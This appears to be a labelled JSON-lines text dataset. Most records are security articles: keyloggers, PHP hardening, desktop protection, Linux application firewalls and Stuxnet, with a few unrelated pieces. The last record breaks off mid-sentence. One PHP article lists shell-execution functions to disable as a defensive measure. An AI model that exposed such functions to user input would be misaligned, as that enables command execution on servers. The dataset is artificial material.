{"text": "Modern programming languages have little support for writing secure software,\nmaking it all too easy to write programs with exploitable vulnerabilities.\nIn these lectures, we explore a general technique based on type qualifiers\nthat allows programmers to write down, in their souce code, their intentions\nwith respect to security. We will describe how to mechanically verify that\nannotated code adheres to the policy.\nWe will discuss the theoretical foundations and practical implementation issues.\nAs a particular example, we show how to use type qualifiers to find format-string\nvulnerabilities in widely-deployed C programs and to find other security\nvulnerabilites in the Linux kernel. we will also look at alias analysis, another\nimportant program analysis problem, and show how a must-alias analysis system\ncorresponds to a system for statically checking access control.\nThis series of lectures will discuss the requirements, protocols, and\ncomponents of network security software on the Internet. Topics will\ninclude secure tunnels, security for web services, privacy constraints,\ndesign features that create or address DoS threats, and the use of\nprogrammable security tokens in network protocols. The primary emphasis\nwill be the relationship between models and design, including topics like\nthe quantification of DoS threats, models for code security in programmable\ntokens, strategies for composition and interoperation, and practical\nstrategies for formal analysis of network protocol designs and software.\nIn these lectures, we will analyze the security infrastructure in\ncurrent, main-stream programming systems and platforms such as\nthe Java Virtual Machine and Common Language Runtime. We will explain\nhow byte code verification collaborates with the class loader and\nsecurity manager to provide a secure run-time environment.\nWe will also use theoretical tools to determine what properties\ncurrent security systems based on stack inspection have\nand provide concrete proposals for improving the infrastructure\nfor next-generation programming languages and systems.", "label": 1}
{"text": "Data storage and management software is used to help manage the tasks associated with maintaining and accessing data stored in data files.\nBackup and Recovery Software (35 suppliers)\nBackup software and recovery software creates copies of files, databases, disks, drives, or entire computer systems to avoid the permanent loss of data. These applications also enable the retrieval of data from damaged files, storage devices, or file systems.\nLearn more about Backup and Recovery Software\nData Storage Management Software (493 suppliers)\nData storage management software is designed for database management, data backup and recovery, and other data management functions.\nLearn more about Data Storage Management Software\nData Warehousing Software (39 suppliers)\nData warehousing software is used to design, build, manage, implement, and improve data warehouses, repositories of electronically-stored data.\nLearn more about Data Warehousing Software\nStorage Resource and Replication Software (16 suppliers)\nStorage resource and storage replication software is used to monitor the efficiency and speed at which available drive space is utilized in a storage area network (SAN).\nLearn more about Storage Resource and Replication Software", "label": 1}
{"text": "In an increasingly wired and interconnected world, you may be tempted to access your online banking from public Wi-Fi, accept files from people you know only through social-media connections, try out numerous freeware smartphone apps and assume that password protection offers sufficient security for your wireless home network. In the real world of online crooks, scams and fraud, however, these practices can make you a sitting duck for keystroke logger scams.\nHow Keylogging Works\nKeystroke loggers act as data recorders that compile a record of every keystroke you type on your computer. They can be used to obtain illicit access to usernames, passwords, social security numbers and other personally identifiable information, financial data, proprietary technical or business secrets, and formal or casual communications between individuals who use chat or text methods. Some keyloggers run as software programs in the background of your regular computer operations. Others hook directly into your operating system and take over the functions of keystroke interpretation. Finally, some run from hardware devices plugged in to your computer. These virtual or physical pieces of malware can store captured data for physical retrieval or transmit it through your Internet connection to a remote a location.\nA scammer with physical access to your desktop computer can attach a device that contains a keylogging payload to one of the ports on your system. Designed to look like a dongle, plug or cable, these gadgets work most effectively when they attach to the back of your computer, minimizing the likelihood that you recognize their presence. The size and shape of a laptop computer reduces the chances of a keylogger attachment escaping your view, but a keylogger delivered through a USB flash drive could escape your notice. Alternatively, however, one of these devices plugged in to a public computer can bypass the awareness of everyone who used an unfamiliar system. Avoid flash drives of unknown origin and remain alert to changes in your computer's configuration. At the same time, restrict your use of public Wi-Fi to activities that don't disclose your personal and financial information.\nPhishing email scams often include either an attachment that a message encourages you to activate by clicking on it or a link to a site you're encouraged to visit. These messages and their directly attached or indirectly acquired malware payloads can serve as an effective means of introducing software-based keyloggers onto your computer. If you've educated yourself about phishing scams and carefully resist the temptation to click on attachments in suspicious messages or those from unknown senders, you can limit your vulnerability to keyloggers, but maintaining an up-to-date anti-malware program in addition can halt an attack that comes from a dubious file or website destination.\nSmartphones can act as pocket computers, providing unparalleled mobile access to your personal data and files as well as online destinations. Their power, flexibility and mobility also make them ideal targets for phishing scams that can install malware. Free apps can consist entirely of keylogging routines, activated when you install a product only to find that it lacks any business or entertainment value, and become infected in the process. Some freeware products incorporate keyloggers into routines that offer some actual value -- entertainment or otherwise -- but that also record the websites you visit or other aspects of your online behavior, reporting these details to a company that sells consumer-behavior information.\n- Tompkins Trust Company: Trojans and Keystroke Logging\n- Dark Reading: FBI Warns Of Scams Targeting Financial Industry\n- Symantec: Introduction to Spyware Keyloggers\n- Securelist: Keyloggers: How They Work and How to Detect Them (Part 1)\n- Nedbank: Keystroke Logging\n- eWeek: Police Foil $420 Million Keylogger Scam\n- The Register: Hardware Keyloggers Found in Manchester Library PCs\n- The Register: Police Cuff US Student Keystroke Logger\n- SecurityFocus: Guilty Plea in Kinko's Keystroke Caper\n- MSN Money: Your Smartphone May Be Spying on You\n- CNET: FAQ: Demystifying ID Fraud\n- Identity Guard Resource Center: Keylogging: Identity Theft Threat or Useful Tool for Employers?\n- Western Australia Police: What Are Keystroke Loggers?\n- Community Financial Services Bank: Fraud Security: Protecting Yourself from Online Banking Fraud\n- MSN Money: Financial Privacy: Be Wary of These 9 Credit Card Scams\n- Visa Data Security Alert: Key Logger Malware: Key Stroke and Screen Capture\n- NerdWallet: Beware of Scams During the Holidays\n- The Register: Mission Impossible at the Sumitomo Bank\n- Jupiterimages/Comstock/Getty Images", "label": 1}
{"text": "WebMD Medical News\nDaniel J. DeNoon\nLaura J. Martin, MD\nApril 8, 2011 -- What does a government shutdown mean for our health? Here's WebMD's FAQ, with answers to questions from WebMD readers and staff.\nMost government health services are administered by the Department of Health and Human Services. During the government shutdown, 62% of HHS employees will not be allowed to work.\nThe remaining 38% of HHS employees will continue to administer programs that involve the safety of human life and protection of property, as well as programs that pay for themselves.\nHHS shutdown plans remain sketchy, but here's a rundown of how the shutdown affects HHS services:\nThe Veterans Administration is a major source of government supported health care. Here's how the shutdown affects the VA:\nOther non-HHS health services affected by the government shutdown include:\nProbably not. However, closing of most of the FDA means that there will be less drug-safety oversight. Cutbacks at the Centers for Medicare and Medicaid Services mean the popular CMS hotline will have longer wait times, and investigations of Medicare/Medicaid fraud will be suspended.\nDialysis is a life-saving medical procedure. Dialysis centers will not be closed, and patients whose dialysis is supported by Medicare will continue to receive services.\nGovernment health insurance will remain in effect.\nSocial Security itself is not affected by the government shutdown, as it is funded separately. But some government employees who administer Social Security will be furloughed. This likely means that processing of new Social Security applications will slow down, and there will be longer wait times to speak with Social Security personnel.\nSOURCES:Scott Wolfson, director, public information office, Consumer Product Safety Commission.Department of Health and Human Services: \"Contingency Staffing Plan for Operations in the Absence of Enacted Annual Appropriations,\" April 7, 2011.USDS Food Safety and Inspection Service: \"Operations Plan for Absence of Appropriations,\" April 7, 2011.Department of Veterans Affairs: \"VA Contingency Plan: Agency Operations in the Absence of Appropriations,\" April 8, 2011.U.S. Office of Personnel Management: \"The Potential Impact of a Lapse in Appropriations on Federal Employees,\" April 7, 2011.U.S. Department of Agriculture Contingency Plans.Office of Management and Budget: \"Agency Contingency Plans.\"\nHere are the most recent story comments.View All\nThe views expressed here do not necessarily represent those of FOX16 - Breaking News and Weather to Plan Your Day for Little Rock and Central Arkansas\nThe Health News section does not provide medical advice, diagnosis or treatment. See additional information.", "label": 1}
{"text": "PHP is considered an insecure language to develop in not because of secret backdoors put in by the PHP language developers, but because it was initially developed without security as a major concern and compared to other languages/web frameworks its difficult to develop securely in it.\nE.g., if you develop a LAMP/LAPP (linux+apache+mysql/postgresql+PHP) web app, you have to manually code in input/output sanitation to prevent SQL injection/XSS/CSRF, make sure there are no subtle calls to\neval user-supplied code (like in\npreg_replace with a '/e' ending the regexp argument), safely deal with file uploads, make sure user passwords are securely hashed (not plaintext), authentication cookies are unguessable, secure (https) and http-only, etc.\nMost modern web-frameworks simplify many of these issues by doing most of these things in a secure fashion (or initially doing them insecurely and then getting secure updates).\nThe risk of there being a secret backdoor in an open-source PHP is small; and the risk is present in every piece of software (windows/linux/apache/nginx/IIS/postgresql/oracle) you use -- both open-source and closed-source. The open-source ones at least have the benefit that many independent eyes look at it all the time and you could examine it if you wanted.\nAlso note in principle, even after fully examining the source code and finding no backdoors and fully examining the source code of your compiler (finding no backdoors), if you then recompile your compiler (bootstrap by using some untrusted existing compiler) and then compile the safe source code with your newly compiled \"safe\" compiler, your executable code could still have backdoors brought in from using the untrusted existing compiler to compile the new compiler. See Ken Thompson's Reflections on Trusting Trust. (The way this is defended against in practice is by using many independent and obscure compilers from multiple sources to compile any new compiler and then compare the output).", "label": 1}
{"text": "In Writing Secure PHP, I covered a few of the most common security holes in websites. It's time to move on, though, to a few more advanced techniques for securing a website. As techniques for 'breaking into' a site or crashing a site become more advanced, so must the methods used to stop those attacks.\nMost hosting environments are very similar, and rather predictable. Many web developers are also very predictable. It doesn't take a genius to guess that a site's includes (and most dynamic sites use an includes directory for common files) is an www.website.com/includes/. If the site owner has allowed directory listing on the server, anyone can navigate to that folder and browse files.\nImagine for a second that you have a database connection script, and you want to connect to the database from every page on your site. You might well place that in your includes folder, and call it something like connect.inc. However, this is very predictable - many people do exactly this. Worst of all, a file with the extension \".inc\" is usually rendered as text and output to the browser, rather than processed as a PHP script - meaning if someone were to visit that file in a browser, they'll be given your database login information.\nPlacing important files in predictable places with predictable names is a recipe for disaster. Placing them outside the web root can help to lessen the risk, but is not a foolproof solution. The best way to protect your important files from vulnerabilities is to place them outside the web root, in an unusually-named folder, and to make sure that error reporting is set to off (which should make life difficult for anyone hoping to find out where your important files are kept). You should also make sure directory listing is not allowed, and that all folders have a file named \"index.html\" in (at least), so that nobody can ever see the contents of a folder.\nNever, ever, give a file the extension \".inc\". If you must have \".inc\" in the extension, use the extension \".inc.php\", as that will ensure the file is processed by the PHP engine (meaning that anything like a username and password is not sent to the user). Always make sure your includes folder is outside your web root, and not named something obvious. Always make sure you add a blank file named \"index.html\" to all folders like include or image folders - even if you deny directory listing yourself, you may one day change hosts, or someone else may alter your server configuration - if directory listing is allowed, then your index.html file will make sure the user always receives a blank page rather than the directory listing. As well, always make sure directory listing is denied on your web server (easily done with .htaccess or httpd.conf).\nOut of sheer curiosity, shortly after writing this section of this tutorial, I decided to see how many sites I could find in a few minutes vulnerable to this type of attack. Using Google and a few obvious search phrases, I found about 30 database connection scripts, complete with usernames and passwords. A little more hunting turned up plenty more open include directories, with plenty more database connections and even FTP details. All in, it took about ten minutes to find enough information to cause serious damage to around 50 sites, without even using these vulnerabilities to see if it were possible to cause problems for other sites sharing the same server.\nMost site owners now require an online administration area or CMS (content management system), so that they can make changes to their site without needing to know how to use an FTP client. Often, these are placed in predictable locations (as covered in the last article), however placing an administration area in a hard-to-find location isn't enough to protect it.\nMost CMSes allow users to change their password to anything they choose. Many users will pick an easy-to-remember word, often the name of a loved one or something similar with special significance to them. Attackers will use something called a \"dictionary attack\" (or \"brute force attack\") to break this kind of protection. A dictionary attack involves entering each word from the dictionary in turn as the password until the correct one is found.\nThe best way to protect against this is threefold. First, you should add a turing test to a login page. Have a randomly generated series of letters and numbers on the page that the user must enter to login. Make sure this series changes each time the user tries to login, that it is an image (rather than simple text), and that it cannot be identified by an optical character recognition script.\nSecond, add in a simple counter. If you detect a certain number of failed logins in a row, disable logging in to the administration area until it is reactivated by someone responsible. If you only allow each potential attacker a small number of attempts to guess a password, they will have to be very lucky indeed to gain access to the protected area. This might be inconvenient for authentic users, however is usually a price worth paying.\nFinally, make sure you track IP addresses of both those users who successfully login and those who don't. If you spot repeated attempts from a single IP address to access the site, you may consider blocking access from that IP address altogether.\nOne excellent way to make sure that even if you have a problem with someone accessing your database who shouldn't be able to, you can limit the damage they can cause. Modern databases like MySQL and SQL Server allow you to control what a user can and cannot do. You can give users (or not) permission to create data, edit, delete, and more using these permissions. Usually, I try and ensure that I only allow users to add and edit data.\nIf a site requires an item be deleted, I will usually set the front end of the site to only appear to delete the item. For example, you could have a numeric field called \"item_deleted\", and set it to 1 when an item is deleted. You can then use that to prevent users seeing these items. You can then purge these later if required, yourself, while not giving your users \"delete\" permissions for the database. If a user cannot delete or drop tables, neither can someone who finds out the user login to the database (though obviously they can still do damage).\nPHP contains a variety of commands with access to the operating system of the server, and that can interact with other programs. Unless you need access to these specific commands, it is highly recommended that you disable them entirely.\nFor example, the eval() function allows you to treat a string as PHP code and execute it. This can be a useful tool on occasion. However, if using the eval() function on any input from the user, the user could cause all sorts of problems. You could be, without careful input validation, giving the user free reign to execute whatever commands he or she wants.\nThere are ways to get around this. Not using eval() is a good start. However, the php.ini file gives you a way to completely disable certain functions in PHP - \"disable_functions\". This directive of the php.ini file takes a comma-separated list of function names, and will completely disable these in PHP. Commonly disabled functions include ini_set(), exec(), fopen(), popen(), passthru(), readfile(), file(), shell_exec() and system().\nIt may be (it usually is) worth enabling safe_mode on your server. This instructs PHP to limit the use of functions and operators that can be used to cause problems. If it is possible to enable safe_mode and still have your scripts function, it is usually best to do so.\nFinally, Be Completely and Utterly Paranoid\nMuch as I hate to bring this point up again, it still holds true (and always will). Most of the above problems can be avoided through careful input validation. Some become obvious points to address when you assume everyone is out to destroy your site. If you are prepared for the worst, you should be able to deal with anything.\nReady for more? Try Writing Secure PHP, Part 3.", "label": 1}
{"text": "Cyberattacks on IT systems are increasing at an exponential rate. From 2006 to 2009, organizations reported that the number of security incidents grew more than 400 percent. According to reports, many of these security breaches were introduced at the user level.\nAlong with an increase in attacks, there has also been an increase in the quantity and type of data stored on networks. Given the number of staff members with varying security levels who require access to networks, organizations have had to redouble efforts to protect data and systems. Yet securing the desktop, a major access point to the network, is often overlooked.\nFollowing are some simple and effective ways to protect desktops — ensuring that they do not become gateways for unauthorized access to the agency network.\nAlthough it's common practice in many organizations to limit the use of flash drives and other devices that utilize USB ports, many others do not do this. Flash drives open organizations to data theft, and an infected USB device can introduce viruses. If it's necessary to use flash drives, it's best to select a secure drive with on-board antivirus software.\nTypically, antivirus software is already installed on PCs when they arrive from the factory. This is often the first line of defense against viruses attempting to gain access via individual client devices. Whether scanning e-mail attachments or preventing intrusions from infected websites, antivirus software should not be ignored. Many users, however, disable their antivirus software or do not update it. These actions render the software ineffective or obsolete.\nScheduling automatic updates and maintaining the software are both necessary for it to remain effective and serve as a defense against the barrage of viruses that attack networks every day.\nMost malware that enters a desktop, and ultimately the network, comes from users who have downloaded infected software or applications. Restricting the ability of staff to automatically download software or applications reduces vulnerabilities at the desktop and limits the ways in which malware can access an organization's systems.\nSecure KVM (keyboard, video, mouse) switches let users access both secure and nonsecure networks through a single set of peripherals. By keeping various networks isolated from one another, secure KVM switching devices eliminate potential data breaches.\nAuthorized workers can then access secure data with neither the threat of introducing harmful data to the secure network nor any risk of accidentally copying or transferring classified data to systems outside the secure network. Additionally, many secure KVM switches can lock down USB devices, allowing only authorized devices — such as keyboards, mice and Common Access Card readers — to connect to the network.\nThreats are on the rise, with company data and systems as prime targets for hostile foreign governments, terrorists and cybercriminals. The threat posed to federal systems must be addressed using a variety of security solutions; but don't overlook the desktop, which represents one of the most vulnerable access points in any organization's infrastructure.", "label": 1}
{"text": "Ah, the dreaded computer viruses! We’ve all heard about their evil powers: they range from simple pranks like pop-up messages on your screen to complete destruction of programs or data. And they’re getting slicker by the hour, trying to trick you, outsmart your antivirus program and take advantage of the security holes caused by software vulnerabilities. You definitely don’t want one getting into your precious computer!\nSo how can you tell if you've got a virus infection?\nIf your antivirus software is effective and up to date, you’ll probably receive a message saying that the application has found a virus on your PC and has, hopefully, got rid of it. But what if your antivirus is not that efficient, hasn’t been updated in a while or is simply something you never thought you actually needed?\nThere are some signs of infection you can watch out for:\nYour computer stops responding or locks up frequently.\nYou get strange error messages saying that, for example, you cannot access certain drives.\nYour PC runs much slower than it used to.\nYour computer crashes and then restarts every couple of minutes.\nSome applications won’t run, some files won’t open.\nHardware devices (like your printer) no longer respond to your commands or start acting out.\nSome menus and/or dialogue boxes look odd or distorted.\nThere are fluctuations in the size of some files, although you haven’t accessed them in a while.\nYour firewall warns you that unknown applications are trying to connect to the internet.\nYour internet connection stops working or becomes very slow without there being a problem with your service provider or router.\nYou notice files that have been deleted, encrypted or moved to a different location.\nThe language in certain applications suddenly changes.\nNew icons appear on your desktop out of the blue.\nStrange sounds or music start playing from your speakers unexpectedly.\nYour CD-ROM drive tray opens and closes by itself.\nThe unused space on your hard drive disappears.\nYour computer opens internet sessions or applications on its own.\nYour web browser displays pages you haven’t requested.\nLibrary files for running games or programs go missing.\nWhat to do if you suspect a virus is running loose in your system:\nThe first thing to do is turn to your line of defence: the antivirus program. If you’re using a traditional, signature-based antivirus, make sure it’s active and properly updated and scan your computer. If your antivirus program doesn’t find a virus, it doesn’t necessarily mean you’ve got none. But there’s no need to go searching for it yourself. Just look for another antivirus solution to run on your computer and spot the problem. You can find a free BullGuard Internet Security trial here.\nIf it turns out a virus did get by your antivirus, chances are it hit exactly between the updates or it’s so new, its signature hasn’t been detected yet. This is where state-of-the-art virus detection technology comes in handy and that’s what you get by using BullGuard Internet Security – the best in behavioural detection, the latest technology in the fight against new and unknown viruses. Behaviour-based detection is what makes BullGuard catch 65% more malware than traditional antivirus programs.\nHow to avoid virus infections in the first place\nYou can prevent most viruses from entering your system by practicing a few computer and internet safe habits:\nMake a habit out of playing it safe. Pay attention to what you download and where you download it from. Never open attachments from sources you don’t know or trust. Don’t connect other people’s USB drives to your computer, even if they’re your friends, as they could have a virus infection without realizing it.\nAlways have an active and updated antivirus program installed on your computer. The more effective and modern it is, the better it will protect you against the waves of malware hitting the web every day.\nMake sure all your other software is up to date. Vulnerabilities in the programs you use, like your operating system, are like unlocked backdoors for viruses, so it’s crucial to have them solved by getting constant patches and updates from the software vendor. Some of them are downloaded automatically, but others need your attention and that could turn into an annoying task. So give yourself a break and use a vulnerability scanner – like the one included in BullGuard Internet Security – to take care of your programs for you.", "label": 1}
{"text": "A packet filtering firewall, designed to regulate incoming and outgoing packets from a network or an operating system, is akin to security personnel guarding the entrance to a commercial or residential property. Such a system has very little authority, unless given additional powers, in what applications inside the operating system or network are able to do.\nThat is where an application “firewall” comes into play. It is designed to ensure that applications in an operating system (or in some instances, a network) adhere to access control rules that govern their “activities.” It should be noted that an application firewall, like a stateful packet filter, is not a one-shot security solution. It merely adds an extra layer of security to a system, complementing other security protocols and systems in place. That idea also formed the main point of why your computer needs a firewall enabled.\nThis crude sketch shows applications in an operating system when there is no application firewall to regulated their actions. They are free to wander as they please.\nAnd here is what it looks like with an application firewall activated. By the way, this screen shot and the one above, were taken from Tomoyo’s website, an application firewall featured in this article:\nThere are three such applications built into the Linux kernel, and they are available as loadable modules. While they tend to be described using slightly different terminologies, and may even differ in how to operate, once activated, they have the same effect – intelligently enforcing access rights for applications they are configured to monitor. In alphabetical order, the three application firewalls are:\nAn effective and easy-to-use Linux application security system. AppArmor proactively protects the operating system and applications from external or internal threats, even zero-day attacks, by enforcing good behavior and preventing even unknown application flaws from being exploited. AppArmor security policies completely define what system resources individual applications can access, and with what privileges. A number of default policies are included with AppArmor, and using a combination of advanced static analysis and learning-based tools, AppArmor policies for even very complex applications can be deployed successfully in a matter of hours.\nSELinux, or Security-Enhanced Linux, was contributed to the Linux kernel by the National Security Agency. It is the application firewall activated by default in Fedora, and it has a reputation as being a bit more difficult to manage and configure than the others. The following is a brief description of SELinux from its Fedora project page.\nSecurity-Enhanced Linux (SELinux) adds Mandatory Access Control (MAC) to the Linux kernel, and is enabled by default in Fedora. A general purpose MAC architecture needs the ability to enforce an administratively-set security policy over all processes and files in the system, basing decisions on labels containing a variety of security-relevant information. When properly implemented, it enables a system to adequately defend itself and offers critical support for application security by protecting against the tampering with, and bypassing of, secured applications.\nMAC provides strong separation of applications that permits the safe execution of untrustworthy applications. Its ability to limit the privileges associated with executing processes limits the scope of potential damage that can result from the exploitation of vulnerabilities in applications and system services. MAC enables information to be protected from legitimate users with limited authorization as well as from authorized users who have unwittingly executed malicious applications.\nTomoyo was launched in 2003 and its development is sponsored by Japan’s NTT DATA Corporation. It is, as far as I know, the only one that is not used by default on any Linux distribution. However, that should change when the next edition of Chakra Edn is released. According to the official description, Tomoyo is a:\nMandatory Access Control (MAC) implementation for Linux that can be used to increase the security of a system, while also being useful purely as a system analysis tool.\nTOMOYO Linux focuses on the behaviour of a system. Every process is created to achieve a purpose, and like an immigration officer, TOMOYO Linux allows each process to declare behaviours and resources needed to achieve their purpose. When protection is enabled, TOMOYO Linux acts like an operation watchdog, restricting each process to only the behaviours and resources allowed by the administrator.\nMost distributions have one of these applications activated by default. If yours does not, talk to the developer(s) about it. Sometimes, all you need to do is install the userland utilities for managing it.", "label": 1}
{"text": "Smart phone of the future: A chip in your head?\nCNN recently posted an amusing yet thought-provoking article envisioning the development of smart phones over the next 100 years. The story culminates with the collapse of civilization in less than a century (from climate change), and mobile communications being reduced to throwing message rocks at each other.\nThat scenario might’ve made Stanley Kubrick proud, but the idea that most interests me is the authors’ prediction that, in 75 years, a microchip could be inserted into our heads that will allow us to connect directly with others through our brains, as well as to the Internet. While the writers are concerned about potential abuses from commercial advertisers, I can think of a few ways this technology would affect the public sector workplace.\nFirst, security identification badges would become obsolete. Authentication for location access could be done with the brain microchip, and everyone would instantly know if another person was supposed to be there instead because his or her own chip would tell them so. Of course, for this to take place, security would have to be top-notch to stop intruders from using chips made to mask identity. Wow, that sounds like the plot to a great science fiction espionage thriller. You are welcome, 007.\nThe behavior modification scenario the writers propose would be unlikely to occur, I think, because the chip probably would not be connected to that area of the brain. But if it were, network administrators could finally make sure their painstakingly crafted security protocols are actually followed by everyone!\nAlthough the writers project that this development is 75 years away, I think it might come sooner. We already have the technology to make a chip small enough to perform all of the necessary functions. The areas we need to improve in are biological rejection suppression and our understanding of how the human brain works. I’m guessing that latter will probably be the problem that delays us having chips implanted in our heads.\nIt’s all just guesswork at this point, of course, but if the writers are correct about a brain microchip — and wrong about the end of civilization — there would be practical uses for the technology. If nothing else, we could be assured that motorists at last would make only hands-free calls.\nPosted by Greg Crowe on Oct 12, 2012 at 1:25 PM", "label": 1}
{"text": "From identifying Osama bin Laden to proving someone guilty of rape or murder, DNA analysis has become an essential scientific tool for police and criminal justice.\nUnique genetic markers could play a crucial role in the trial of ex-IMF chief Dominique Strauss-Kahn, accused of sexually assaulting a hotel maid in New York.\nVarious media reports, citing sources close to the investigation, have said that DNA from Strauss-Kahn -- believed to be traces of semen -- was found on the shirt of the 32-year-old woman, who has alleged that the French political heavyweight tried to rape her in his hotel suite on May 14.\n\"The DNA technique, the nuclear DNA, is the one and only technique, if properly conducted, that has an extraordinarily high odds against a misidentification,\" said University of Arizona professor of chemistry and geoscience Bonner Denton.\n\"It's very close to 100 percent... It's a much better technique than many other forensic identification techniques, even finger prints.\"\nThanks to DNA analysis and other tests, US officials were able to say they were certain bin Laden was dead, with just a one in 11.8 quadrillion chance of mistaken identity.\nCIA specialists first compared photographs of the Al-Qaeda leader's corpse to photographs of bin Laden and then reviewed a DNA sample against a \"comprehensive profile\" derived from some of his many family members.\nAs a result, an intelligence official said there was no doubt that a team of US Navy SEALs that raided a compound in Pakistan on May 1 had killed the Al-Qaeda founder.\nDenton was part of a National Research Council team that wrote a key report about DNA analysis in 2009 for the US Congress.\n\"Nuclear DNA analysis has been subjected to more scrutiny than any other forensic discipline, with extensive experimentation and validation performed prior to its use in investigations,\" the report said.\nIt concluded that the US medical-legal system needed to be revamped because forensics labs were backlogged and understaffed.\nMore than half of the first 250 people released from prison thanks to a DNA test exonerating them had been initially found guilty based on erroneous medical analysis.\nDNA analysis entered the US criminal system in 1987 when a serial rapist in Florida became the first person whose guilt was proven using the technique.\nFederal authorities, including the US military and all 50 states, now archive DNA samples.\nThe FBI has developed the powerful Combined DNA Index System (CODIS), which catalogs millions of samples.\nEvery Monday morning, the FBI launches a CODIS search automatically comparing millions of DNA profiles of people who were arrested or found guilty with samples collected in cold cases.\nThe methodology has allowed CODIS to confirm the guilt of 140,000 criminals since 1994 and to prove 269 people innocent since 1989, according to University of Virginia School of Law professor Brandon Garrett.\nEach year, DNA analysis clears thousands of suspects, even early on in police investigations.\nA federal investigation in the 1990s found that 25 percent of principal suspects had been cleared of all suspicion thanks to DNA tests.\nThe reliability of the technique can also establish the identity of a child's parents at low cost.\nAnd it shed new light on the relationship between Thomas Jefferson and the third US president's black slave Sally Hemings, finding that he likely fathered several children with her.\nExplore further: Don't lose the organism in the excitement over its genes, biologists urge", "label": 1}
{"text": "Remotes via IP\nPutting it all together\nSo let me summarize the problems with Internet transmission of audio and the techniques used to minimize them. First, there is network congestion, or plain lack of bandwidth. That issue is tackled by minimizing the necessary bandwidth, by using a lossy codec (or in the case of APT, making use of ADPCM) and striking a correct balance between bandwidth and packet size. Loss of packets is addressed to the extent practicable by FEC. Packet jitter is addressed with a jitter buffer.\nAll that said, network security is yet another issue. Your LAN is likely attached to a router that allows users on your network to access the Internet. The connections made through this router originate behind it - on the LAN side. The router will allow access to the Internet, and in turn it expects a response from the far end. But think about it: If you are in the field, and trying to connect to an IP codec connected to your network, and the router serves as a firewall, the connection will be refused. As far as that router is concerned, an intrusion is being attempted.\nThere are several ways around this. The first is to inform the network administrator that for the new IP codec to work, certain ports need to be open on the firewall, so the IP codec in the field can set up communication between itself and the studio codec. If your network architecture includes a DMZ, your network admin may allow you to place the IP codec on that subnet instead.\nThe second way is a bit more complicated; consider this if your network administer doesn't want to play ball with you. A proxy server can be used as an intermediary. This proxy server is located outside the firewall. A session can be initiated by the studio codec to this proxy server; the proxy records the IP address (among other things) of the studio codec and actually maintains the connection thereafter. From the field, you connect to the proxy server, and it redirects the packet data to the studio codec, through the same connection it has kept open.\nAnd there is a final way to do this, which may be the easiest way. Have an Internet connection put into the studio (like DSL or cable) and reserve its use for just the IP codec. Leave it completely isolated from the LAN, so you can forsake those network security issues. One problem with this method is that your Internet provider may not provide you with a static IP address. Either pick one that does, or make sure you know if and when the IP address has changed before you head out into the field.\nMaking use of the Internet for remotes can be looked at as a double-edged sword; while one has to take the time to learn about a whole new technology (and undoubtedly be tripped up a few times along the way), the universe of locations from which remotes can be done opens up dramatically. I for one believe that good remotes can make for good radio; and I'm quite sure that, 5 to 10 years out, the trepidation experienced in going out to do an IP remote for the first time will have long since evaporated.\n|Codec||Connectivity||Size||Audio I/O||User Access||Supported Encoding Algorithms||Max Audio Freq.||Variable Packet Size||FEC||Packet Jitter Buffer|\n|MPEG 1/2 layer 2/3||AAC||G.722||Linear||Apt-x||other/\n|APT Worldcast Eclipse aptx.com||IP, ISDN, X.21/V.35||1RU||analog or AES-3||GUI||Y||Y||Y||Y||Y||-||24kHz||Y||N||Y|\n|Musicam Suprima musicamusa.com||IP, ISDN X.21/V.35||1RU||analog or AES-3||Web Browser||Y||Y||Y||Y||Y||-||24kHz||Y||N||Y|\n|AEQ Phoenix aeqbroadcast.com||IP, ISDN X.21/V.35||1RU||analog or AES-3||Front Panel, USB||Y||Y||Y||Y||N||-||20kHz||Y during setup||N||Y|\n|Audio TX STL-IP www.audiotx.com||IP||1RU||analog or AES-3||Web Browser||Y||Y||Y||Y||N||-||48kHz||N||Y||Y|\n|Telos Iport telos-systems.com||IP||2RU||analog or AES-3||Web Browser||Y||Y||N||N||N||-||20kHz||N||N||N|\n|Comrex Access comrex.com||IP||1RU||analog or AES-3||Web Browser||N||optional||N||N||N||BRIC HQ1, HQ2||15kHz||Y||Y||Y|\n|Tieline IP tieline.com||IP, optional ISDN, X.21/V.35, POTS, GSM||1RU and 2RU||analog and AES-3||Front Panel, USB, Web Browser, RJ-45||Layer 2||N||Y||Y||N||Tieline Voice, Tieline Music, Tieline Music Plus, Raw Audio||23kHz||Y||Y||Y|\nIrwin is the chief engineer of WKTU-FM, New York City.\nAcceptable Use Policy blog comments powered by Disqus\n[an error occurred while processing this directive]\nToday in Radio History\nThe history of radio broadcasting extends beyond the work of a few famous inventors.\nEAS Information More on EAS\nThe feed provides feeds for all US states and territories.\nNeed a calendar for your computer desktop? Use one of ours.\nInformation from manufacturers and associations about industry news, products, technology and business announcements.\nThis high-visibility and high-traffic area got the full acoustic treatment.\nBrowse Back Issues[an error occurred while processing this directive]\nAlso in the May Issue\n- Remote Access and Site Connectivity: Wireless\n- Standards of FM Allocation and Interference\n- Side by Side: Mic Processors\n- Field Report: Deva Broadcast DB4004\n- Field Report: APT WorldCast Systems Horizon NextGen\n- New Products\n- 20 Years of Radio magazine: May 1994", "label": 1}
{"text": "In the 20th century, this would have been a job for James Bond.\nThe mission: Infiltrate the highly advanced, securely guarded enemy headquarters where scientists in the clutches of an evil master are secretly building a weapon that can destroy the world. Then render that weapon harmless and escape undetected.\nBut in the 21st century, Bond doesn't get the call. Instead, the job is handled by a suave and very sophisticated secret computer worm, a jumble of code called Stuxnet, which in the last year has not only crippled Iran's nuclear program but has caused a major rethinking of computer security around the globe.\nIntelligence agencies, computer security companies and the nuclear industry have been trying to analyze the worm since it was discovered in June by a Belarus-based company that was doing business in Iran. And what they've all found, says Sean McGurk, the Homeland Security Department's acting director of national cyber security and communications integration, is a “game changer.”\nThe construction of the worm was so advanced, it was “like the arrival of an F-35 into a World War I battlefield,” says Ralph Langner, the computer expert who was the first to sound the alarm about Stuxnet. Others have called it the first “weaponized” computer virus.\nSimply put, Stuxnet is an incredibly advanced, undetectable computer worm that took years to construct and was designed to jump from computer to computer until it found the specific, protected control system that it aimed to destroy: Iran’s nuclear enrichment program.\nThe target was seemingly impenetrable; for security reasons, it lay several stories underground and was not connected to the World Wide Web. And that meant Stuxnet had to act as sort of a computer cruise missile: As it made its passage through a set of unconnected computers, it had to grow and adapt to security measures and other changes until it reached one that could bring it into the nuclear facility.\nWhen it ultimately found its target, it would have to secretly manipulate it until it was so compromised it ceased normal functions.\nAnd finally, after the job was done, the worm would have to destroy itself without leaving a trace.\nThat is what we are learning happened at Iran's nuclear facilities -- both at Natanz, which houses the centrifuge arrays used for processing uranium into nuclear fuel, and, to a lesser extent, 